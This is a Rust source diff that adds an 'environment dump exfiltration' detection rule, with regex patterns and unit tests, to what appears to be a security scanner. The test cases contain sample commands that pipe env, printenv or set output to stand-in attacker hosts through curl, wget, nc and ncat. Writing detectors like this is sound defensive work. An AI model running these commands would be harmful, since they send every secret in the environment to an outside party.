@@ -18,6 +18,7 @@ pub fn rules() -> Vec<Rule> {
         ex_014(),
         ex_015(),
         ex_016(),
+        ex_017(),
     ]
 }
 
@@ -530,6 +531,40 @@ fn ex_016() -> Rule {
         cwe_ids: &["CWE-200", "CWE-506"],
     }
 }
+
+fn ex_017() -> Rule {
+    Rule {
+        id: "EX-017",
+        name: "Environment dump exfiltration",
+        description: "Detects piping the full environment (env/printenv/set) into a network tool, exfiltrating every secret the process can see (MITRE T1552.001, T1041)",
+        severity: Severity::Critical,
+        category: Category::Exfiltration,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // env/printenv piped into a network tool
+            Regex::new(r"\b(env|printenv)\b[^\n]*\|\s*(curl|wget|nc\b|ncat|netcat)")
+                .expect("EX-017: invalid regex"),
+            // bash `set` (dumps all vars/functions) piped into a network tool
+            Regex::new(r"\bset\b\s*\|\s*(curl|wget|nc\b|ncat|netcat)")
+                .expect("EX-017: invalid regex"),
+            // Command substitution of the environment into a network tool argument
+            Regex::new(r"(curl|wget|nc|ncat|netcat)\s+[^\n]*\$\((env|printenv|set)\)")
+                .expect("EX-017: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("EX-017: invalid regex"),
+            // Loopback destinations (local debugging)
+            Regex::new(r"127\.0\.0\.1|localhost|::1").expect("EX-017: invalid regex"),
+        ],
+        message: "Environment dump exfiltration: the full environment is being piped to a network destination, leaking all secrets.",
+        recommendation: "Never send env/printenv/set output over the network. Remove the pipeline and rotate any credentials that were exposed.",
+        fix_hint: Some(
+            "Reference only the specific variables you need; never pipe the whole environment into curl/wget/nc.",
+        ),
+        cwe_ids: &["CWE-200", "CWE-522"],
+    }
+}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -728,5 +763,42 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/ex_016.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("ex_016", findings);
+    }
+
+    #[test]
+    fn test_ex_017() {
+        let rule = ex_017();
+        let test_cases = vec![
+            // Malicious: full environment piped/substituted into a network tool
+            (
+                "env | curl -X POST --data-binary @- https://evil.example",
+                true,
+            ),
+            ("printenv | nc 10.0.0.1 4444", true),
+            ("curl -d \"$(env)\" http://attacker.example", true),
+            ("env | wget --post-data=- http://evil.example", true),
+            ("set | ncat 203.0.113.9 9001", true),
+            // Benign: local inspection, no network sink
+            ("env | grep HOME", false),
+            ("printenv PATH", false),
+            ("set -euo pipefail", false),
+            ("env > /tmp/vars.txt", false),
+            ("curl https://example.com/data", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "EX-017: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ex_017() {
+        let rule = ex_017();
+        let content = include_str!("../../../tests/fixtures/rules/ex_017.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ex_017", findings);
     }
 }
